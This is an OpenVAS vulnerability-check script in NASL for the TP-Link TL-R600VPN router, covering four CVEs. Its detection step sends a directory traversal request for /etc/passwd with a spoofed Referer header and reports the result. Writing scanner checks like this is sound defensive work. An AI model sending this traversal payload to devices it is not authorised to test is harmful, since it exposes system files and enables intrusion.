##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tp_link_tl_r600vpn_mult_vuln.nasl 12938 2019-01-04 07:18:11Z asteins $
#
# TP-Link TL-R600VPN Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141702");
  script_version("$Revision: 12938 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-04 08:18:11 +0100 (Fri, 04 Jan 2019) $");
  script_tag(name:"creation_date", value:"2018-11-20 08:40:10 +0700 (Tue, 20 Nov 2018)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_cve_id("CVE-2018-3948", "CVE-2018-3949", "CVE-2018-3950", "CVE-2018-3951");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TP-Link TL-R600VPN Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Router_Webserver/banner");

  script_tag(name:"summary", value:"TP-Link TL-R600VPN is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"TP-Link TL-R600VPN is prone to multiple vulnerabilities:

  - HTTP denial of service (CVE-2018-3948)

  - HTTP server information disclosure (CVE-2018-3949)

  - HTTP server ping address remote code execution (CVE-2018-3950)

  - HTTP server fs directory remote code execution (CVE-2018-3951)");

  script_tag(name:"affected", value:"TP-Link TL-R600VPN HWv3 FRNv1.3.0 and HWv2 FRNv1.2.3 and probably others.");

  script_tag(name:"solution", value:"Update to the latest firmware version.");

  script_xref(name:"URL", value:"https://blog.talosintelligence.com/2018/11/tplinkr600.html");
  script_xref(name:"URL", value:"https://www.tp-link.com/us/products/details/cat-4909_TL-R600VPN.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

banner = get_http_banner(port: port);

if (!banner ||
    ("Server: Router Webserver" >!< banner && "TP-LINK Gigabit Broadband VPN Router R600VPN" >!< banner))
  exit(0);

host = http_host_name(port: port);
headers = make_array("Referer", "http://" + host + "/Index.htm");

url = '/help/../../../../../../../../../../../../../../../../etc/passwd';

req = http_get_req(port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res =~ 'root:.*:0:[01]:') {
  report = 'It was possible to obtain /etc/passwd with a directory traversal attack.\n\nResult:\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
